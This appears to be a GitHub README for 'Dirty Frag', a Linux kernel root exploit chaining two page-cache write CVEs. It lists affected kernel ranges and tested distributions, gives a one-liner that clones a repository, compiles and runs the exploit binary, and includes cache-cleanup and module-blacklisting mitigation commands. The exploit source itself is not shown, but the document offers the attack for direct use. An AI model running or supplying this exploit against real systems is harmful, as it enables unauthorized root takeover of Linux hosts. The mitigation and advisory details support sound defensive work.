# Dirty-Frag-
Linux CVE-2026-43284 &amp; CVE-2026-43500

Copied from @V4bel :) Thanks :)

This document describes the Dirty Frag vulnerability class, first discovered and reported by Hyunwoo Kim (@v4bel), which can obtain root privileges on major Linux distributions by chaining the xfrm-ESP Page-Cache Write (CVE-2026-43284) vulnerability and the RxRPC Page-Cache Write (CVE-2026-43500) vulnerability.

Dirty Frag is a case that extends the bug class to which Dirty Pipe and Copy Fail belong. Because it is a deterministic logic bug that does not depend on a timing window, no race condition is required, the kernel does not panic when the exploit fails, and the success rate is very high.

For detailed technical information and the timeline, see here.

    xfrm-ESP Page-Cache Write (CVE-2026-43284) was patched in mainline f4c50a4034e6.
    RxRPC Page-Cache Write (CVE-2026-43500) was patched in mainline aa54b1d27fe0.


Exploiting : Only run in authorized engagements !!

Oneliner: git clone https://github.com/Minime794/Dirty-Frag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp

Step by Step :

first compile the exploit, then run the binary 

gcc -O0 -Wall -o exp exp.c -lutil

./exp

!! Cleanup

⚠️ Important: After running this exploit, the page cache is contaminated. To clear the polluted page cache and ensure system stability, either run:

echo 3 > /proc/sys/vm/drop_caches

or reboot the system.
Affected Versions

    CVE-2026-43284: xfrm-ESP Page-Cache Write vulnerability is in scope from cac2661c53f3 (2017-01-17) up to f4c50a4034e6 (2026-05-05).
    CVE-2026-43500: RxRPC Page-Cache Write vulnerability is in scope from 2dc334f1a63a (2023-06-08) up to aa54b1d27fe0 (2026-05-10).

In other words, the effective lifetime of the vulnerabilities is about 9 years.

This Dirty Frag has been tested on the following distribution versions.

    Ubuntu 24.04.4: 6.17.0-23-generic
    RHEL 10.1: 6.12.0-124.49.1.el10_1.x86_64
    openSUSE Tumbleweed: 7.0.2-1-default
    CentOS Stream 10: 6.12.0-224.el10.x86_64
    AlmaLinux 10: 6.12.0-124.52.3.el10_1.x86_64
    Fedora 44: 6.19.14-300.fc44.x86_64
    ...

Mitigation

    Use the following command to remove the modules in which the vulnerabilities occur and clear the page cache.

sh -c "printf 'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n' > /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2>/dev/null; echo 3 > /proc/sys/vm/drop_caches; true"

    Once each distribution backports a patch, update accordingly.

